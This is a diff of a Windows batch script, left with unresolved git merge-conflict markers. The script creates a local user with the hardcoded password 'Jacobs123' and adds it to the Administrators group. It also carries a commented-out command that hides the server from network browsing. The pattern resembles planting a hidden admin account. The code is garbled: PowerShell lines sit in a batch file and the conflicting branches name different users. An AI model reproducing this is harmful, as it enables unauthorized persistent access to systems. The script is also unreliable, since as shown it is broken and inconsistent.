@@ -1,8 +1,14 @@
 @echo off
 :: net config server /hidden:yes /srvcomment:"Windows Server" > out.txt 2 >&1
+<<<<<<< HEAD
+:: net user brooke Jacobs123 /add /active:yes /logonpasswordchg:no > nul
+$password = ConvertTo-SecureString "Jacobs123" -AsPlainText -Force
+New-LocalUser "mika" -Password $Password
+=======
 :: net user brooke Jacobs123 /add /active:yes /logonpasswordchg:no > nul
 $password = ConvertTo-SecureString "Jacobs123" -AsPlainText -Force
 New-LocalUser "brooke" -Password $Password
+>>>>>>> 927656bea3b992c5c7224ca0fe94c851ff5e4b51
 :: net localgroup Administrators brooke /add > nul
 powershell -command " Add-LocalGroupMember -Group 'Administrators' -Member 'brooke' "
 diskperf -y > nul
